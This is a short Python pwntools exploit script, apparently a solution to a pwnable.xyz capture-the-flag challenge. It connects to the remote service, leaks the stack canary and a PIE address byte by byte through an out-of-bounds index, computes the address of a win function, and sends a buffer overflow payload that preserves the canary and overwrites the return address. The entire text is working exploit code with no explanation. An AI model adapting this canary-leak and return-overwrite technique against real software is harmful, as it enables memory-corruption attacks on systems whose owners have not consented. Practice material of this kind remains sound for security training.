from pwn import *
#target=process('./challenge')
target=remote('svc.pwnable.xyz',30017)

def init(option):
	print(target.recvuntil("> "))
	target.sendline(option)

def edit(data):
	init("\x31")
	print(target.recvuntil(": "))
	target.sendline(data)
	
def leak(index):
	init(index)
	print(target.recvuntil(": "))
	leaks=int(target.recvuntil(" ").strip(" "))
	print(target.recvline())
	return leaks

canary="\x00"
#pause()
print(target.recvuntil(": "))
target.sendline("A")
for i in range(7):
	leaks=leak(p8(0x3b+i))
	canary+=p8(leaks)
	print(hex(u64(canary.ljust(8,"\x00"))))
pie_leak=""
for i in range(6):
	leaks=leak(p8(0x4a+i))
	pie_leak+=p8(leaks)
	print(hex(u64(pie_leak.ljust(8,"\x00"))))

pie_leak=u64(pie_leak.ljust(8,"\x00"))
pie_win=pie_leak-0xb30+0xaac
edit("A"*0x28+canary+"A"*0x8+p64(pie_win))
init("\x30")
target.interactive()
